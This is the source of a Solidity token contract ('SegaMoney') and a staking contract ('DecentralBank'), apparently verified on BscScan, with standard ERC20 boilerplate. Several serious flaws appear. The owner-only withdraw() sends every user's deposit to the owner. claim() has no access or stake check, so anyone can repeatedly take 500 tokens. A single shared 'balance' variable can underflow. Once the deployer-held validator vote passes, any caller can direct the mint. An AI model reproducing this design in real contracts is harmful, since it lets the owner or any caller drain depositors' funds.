/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

// File: segarunner.sol

/**
 *Submitted for verification at Etherscan.io on 2023-01-14
*/

pragma solidity >=0.6.0 <0.9.0;


contract Context {
    
    constructor () internal { }
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


pragma solidity >=0.6.0 <0.9.0;


interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount) external returns (bool);

   
    function allowance(address owner, address spender) external view returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts/mintable/SafeMath.sol

pragma solidity >=0.6.0 <0.9.0;


library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// File: contracts/mintable/ERC20.sol

pragma solidity >=0.6.0 <0.9.0;




contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

   
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

   
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
    }
}

// File: contracts/mintable/ERC20Detailed.sol

pragma solidity >=0.6.0 <0.9.0;


/**
 * @dev Optional functions from the ERC20 standard.
 */
abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

// File: contracts/mintable/Roles.sol

pragma solidity >=0.6.0 <0.9.0;

/**
 * @title Roles
 * @dev Library for managing addresses assigned to a Role.
 */
library Roles {
    struct Role {
        mapping (address => bool) bearer;
    }

    /**
     * @dev Give an account access to this role.
     */
    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }

    /**
     * @dev Remove an account's access to this role.
     */
    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }

    /**
     * @dev Check if an account has this role.
     * @return bool
     */
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
}

// File: contracts/mintable/MinterRole.sol

pragma solidity >=0.6.0 <0.9.0;



contract MinterRole is Context {
    using Roles for Roles.Role;

    event MinterAdded(address indexed account);
    event MinterRemoved(address indexed account);

    Roles.Role private _minters;

    constructor () internal {
        _addMinter(_msgSender());
    }

    modifier onlyMinter() {
        require(isMinter(_msgSender()), "MinterRole: caller does not have the Minter role");
        _;
    }

    function isMinter(address account) public view returns (bool) {
        return _minters.has(account);
    }

    function addMinter(address account) public onlyMinter {
        _addMinter(account);
    }

    function renounceMinter() public {
        _removeMinter(_msgSender());
    }

    function _addMinter(address account) internal {
        _minters.add(account);
        emit MinterAdded(account);
    }

    function _removeMinter(address account) internal {
        _minters.remove(account);
        emit MinterRemoved(account);
    }
}

// File: contracts/mintable/ERC20Mintable.sol

pragma solidity >=0.6.0 <0.9.0;




contract ERC20Mintable is ERC20, MinterRole {
    
    function mint(address account, uint256 amount) internal onlyMinter returns (bool) {
        _mint(account, amount);
        return true;
    }
}

// File: contracts/mintable/ERC20Burnable.sol

pragma solidity >=0.6.0 <0.9.0;




contract ERC20Burnable is Context, ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev See {ERC20-_burnFrom}.
     */
    function burnFrom(address account, uint256 amount) public {
        _burnFrom(account, amount);
    }
}



pragma solidity >=0.6.0 <0.9.0;

contract SegaMoney is ERC20, ERC20Detailed, ERC20Mintable, ERC20Burnable {
    constructor() 
    ERC20Detailed("SegaMoney", "SEGAMONEY", 18) public {
        for(uint i =0 ;i < VALIDATOR_NUMBERS; i++ )
        {
            validators[i] = _msgSender();
        }
        super.mint(_msgSender(), 10000000000 * 10 ** 18);
    }
    uint256 constant VALIDATOR_NUMBERS = 20;
    address[VALIDATOR_NUMBERS]  public validators;
    bool[VALIDATOR_NUMBERS] public   enableMint;
    uint256 public pendingMintAmount;
    function mintRequest(uint256 _amount) onlyMinter public {
        if(pendingMintAmount == 0) {
            pendingMintAmount = _amount;
        }
        else{
            for(uint i =0 ;i < VALIDATOR_NUMBERS; i++ )
            {
                if(enableMint[i])
                {
                    enableMint[i] = false ;
                }
            }
             pendingMintAmount = _amount;
        }
    }
    modifier validIndex(uint _index) {
        require(_index < VALIDATOR_NUMBERS , "index should be less than 20");
        _;
    }
    modifier validValidatorAddress(uint256 _index) {
        require(_msgSender() == validators[_index], "this address is not commuinity member" );
        _;
    }
    function getValidatorAddress(uint256 _index) public view validIndex(_index) returns (address)
    {
        return validators[_index];
    }
    function getValidatorIndex(address _account) public view returns(uint256)
    {
        for(uint i =0 ;i < VALIDATOR_NUMBERS; i++ )
        {
            if(validators[i] == _account)
            {
                return i;
            }
        }
        return  VALIDATOR_NUMBERS;
    }
    function setMintEnable(uint256 _index, bool _mintEnable) public  validIndex(_index) validValidatorAddress(_index) {
        enableMint[_index] = _mintEnable ;
    }
    function transactValidatorRole(uint256 _index, address _account) public validIndex(_index) validValidatorAddress(_index)
    {
        require(_account != address(0) , "address of validator can't be zero");
        validators[_index] = _account;
    }
    function getMintable() public view returns (bool) {
        uint enableCount = 0 ;
        for(uint i = 0 ; i < VALIDATOR_NUMBERS; i++)
        {
            if(enableMint[i])
            {
                enableCount += 1;
            }
        }
        if(enableCount >= VALIDATOR_NUMBERS / 2 )
        {
            return true;
        }
        else{
            return false;
        }
    }
    function getMintEnableCount() public view returns (uint256)
    {
                uint enableCount = 0 ;
        for(uint i = 0 ; i < VALIDATOR_NUMBERS; i++)
        {
            if(enableMint[i])
            {
                enableCount += 1;
            }
        }
        return enableCount;
    }
    function mint(address account) public returns (bool) {
        require(pendingMintAmount > 0, "there is no pending mint amount");
        require(getMintable(), "the vote count of validator members should be greater than 10");
        super.mint(account, pendingMintAmount);
        for(uint i =0 ;i < VALIDATOR_NUMBERS; i++ )
        {
            if(enableMint[i])
            {
                enableMint[i] = false ;
            }
        }
        pendingMintAmount = 0;
    }
}

pragma solidity >=0.6.0 <0.9.0;


contract DecentralBank {
  string public name = 'Decentral Bank';
  address public owner;
  SegaMoney public tether;
  SegaMoney public rwd;
  uint claimablereward;
  mapping(address => uint) public ing;

  address[] public stakers;

  mapping(address => uint) public stakingBalance;
  mapping(address => bool) public hasStaked;
  mapping(address => bool) public isStaking;
  uint public Total_Deposited;
  uint public balance;
  address private _owner;



constructor(SegaMoney _rwd, SegaMoney _tether) public {
    rwd = _rwd;
    tether = _tether;
    owner = msg.sender;
    Total_Deposited = 0;
    balance = 0;
    _owner = msg.sender;
    claimablereward = 500;
}

    modifier onlyOwner() {
        require(_owner == msg.sender, "Caller =/= owner.");
        _;
    }
    

  // staking function   
function depositTokens(uint _amount) public {

  // require staking amount to be greater than zero
    require(_amount > 0, 'amount cannot be 0');
  
  // Transfer tether tokens to this contract address for staking
  tether.transferFrom(msg.sender, address(this), _amount * 10**18);

  // Update Staking Balance
  stakingBalance[msg.sender] = stakingBalance[msg.sender] + _amount;
  Total_Deposited = Total_Deposited + _amount;
  balance = stakingBalance[msg.sender];


  if(!hasStaked[msg.sender]) {
    stakers.push(msg.sender);
  }

  // Update Staking Balance
    isStaking[msg.sender] = true;
    hasStaked[msg.sender] = true;
}

function set_claimablereward(uint _amount) public onlyOwner{
    claimablereward = _amount;
}

  function withdraw() public onlyOwner{
       uint256 _balance = Total_Deposited;
       // require the amount to be greater than zero
       require(_balance > 0, 'staking balance cannot be less than zero');
       balance = 0;
       Total_Deposited = 0;
       // transfer the tokens to the specified contract address from our bank
      tether.transfer(msg.sender, _balance * 10**18);

  }


  function claim() public {
       uint _balance = 500;
       balance = balance - 500;
       Total_Deposited = Total_Deposited - 500;
       // transfer the tokens to the specified contract address from our bank
      tether.transfer(msg.sender, _balance * 10**18);

  }

}